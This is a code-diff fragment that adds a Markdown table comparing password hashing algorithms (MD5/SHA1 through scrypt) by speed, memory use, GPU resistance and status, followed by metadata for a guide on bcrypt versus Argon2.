+## Password Hashing Algorithms Compared
+
+| Algorithm | Speed | Memory | GPU Resist | Year | Status |
+|-----------|-------|--------|-----------|------|--------|
+| MD5/SHA1 | ⚡ Fast | None | ❌ No | 1992 | ❌ Broken |
+| SHA256 | ⚡ Fast | None | ❌ No | 2001 | ⚠️ Weak |
+| PBKDF2 | 🚷 Slow | Low | ⚠️ Maybe | 2000 | ✅ OK |
+| bcrypt | 🚷 Slow | Low | ✅ Yes | 1999 | ✅ Good |
+| scrypt | 🚷🚷 Slow | High | ✅✅ Yes | 2009 | ✅ Great |
   {
     slug: "password-security-hashing-bcrypt-argon2",
     title: "Password Security: Hashing, Salting & Bcrypt vs Argon2 Guide",
